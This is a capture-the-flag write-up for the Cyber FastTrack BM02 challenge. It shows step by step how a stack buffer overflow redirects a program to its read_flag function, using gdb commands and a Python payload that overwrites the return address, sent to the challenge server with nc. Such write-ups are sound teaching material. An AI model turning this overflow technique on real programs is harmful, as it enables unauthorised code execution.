# Cyber FastTrack Spring 2020- BM02 Solution
In this challenge, we use buffer overflow to display the flag.\
BM02.PNG\
![image info](BM02.PNG)
* This is the challenge for BM02.

BM02_1.PNG\
![image info](BM02_1.PNG)
* We use IDA software to display the structure of this program. There are the exploitable(char const*) function and the read_flag(void) function. Also, there are some local variales that stored in the explotable() function. For a better understanding of the program, we need a gdb debugger.

BM02_2.PNG\
![image info](BM02_2.PNG)
* In the terminal, we type `gdb <name of your program>` to start the debugger.
* Type `run` to run the program in the debugger.
* Hold down the Ctrl key and press c

BM02_3.PNG\
![image info](BM02_3.PNG)
* Notice that, if we look through the program, we know that we must enter `add_candidate` in order to add employee and use the exploitable() function.

BM02_4.PNG\
![image info](BM02_4.PNG)
* Enter `disas exploitable(char const*)`
* Enter `c` to continue without paging
* we use break *address to set a break point. In this case, we use 0x5655634d.


BM02_5.PNG\
![image info](BM02_5.PNG)
* Type `break *0x5655634d`
* Type `run`
* Type `add_candidate`

BM02_6.PNG\
![image info](BM02_6.PNG)
* Enter one information for each of the First Name, Last Name, and Job Title.
  * In this case, I entered `First` as the First Name, `Last` as the Last Name, and `Title` as the Job Title.
* Then, you will encounter an breakpoint at `Breakpoint 1, 0x5655634d in exploitable(char const*) ()`

BM02_7.PNG\
![image info](BM02_7.PNG)
* Enter info frame to get the return address that stored at eip. In this case, the return address is `0x56557492`. 

BM02_8.PNG\
![image info](BM02_8.PNG)
* Display the current and the next 199 stack pointer.
* Enter `x/200x $sp`
* The addresses that are 0x00000000 are local variables that we need to fill in before accessing/changing the return address. So in a text file, we enter the following and save it as a python file.
```python
print("add_candidate")
print('A'*20)
```
BM02_9.PNG\
![image info](BM02_9.PNG)
* Hold down the Ctrl key and press c to exit the current program
* To run the program again, we type `run < <(python bm02.py)`
* Type `y` to start from the beginning
* In order to see the differences, we enter x/200x $sp to display the current and the next 199 stack pointer.
	From BM02_9.PNG, we see that there are twenty-five `0x00000000` remaining for us to fill out and then we have to overwrite the `0xdeadbeef`.
	Next, in order for us to change to return address, we need to overwrite the addresses that are before the return address. There are three adresses remaining to changes. Then, we changes the return address to `0x5655615d`. Note: we get `0x5655615d` from `disas read_flag` in the debugger. Remember, we have to write the addresses in reverse byte order.
	So, we changes the contents of the python file to:
```python
print("add_candidate")
print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
```	

BM02_10.PNG\
![image info](BM02_10.PNG)
* Hold down the Ctrl key and press c to exit the current program
* To run the program again, we type `run < <(python bm02.py)`
* Type y to start from the beginning
* Enter `info frame` to see if the return address changed to `0x5655615d`.

BM02_11.PNG\
![image info](BM02_11.PNG)
* Use `si` to execute one instruction at a time to see if the program enters the `read_flag(void)` function.
* We see that the program enters the `read_flag(void)` function.

BM02_12.PNG\
![image info](BM02_12.PNG)
* Use `si` to execute one instruction at a time and we will see the flag eventually.

BM02_13.PNG\
![image info](BM02_13.PNG)
* In order to get the server to response to our request, we need to print out the last name and the job title. So we edit the python file as below:
```python
print("add_candidate")
print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
print("Last")
print("Title")
```	
* Send the bm02.py to the server and it would prints out the flag.
  * `python bm02.py | nc bm02.allyourbases.co 9003`





	
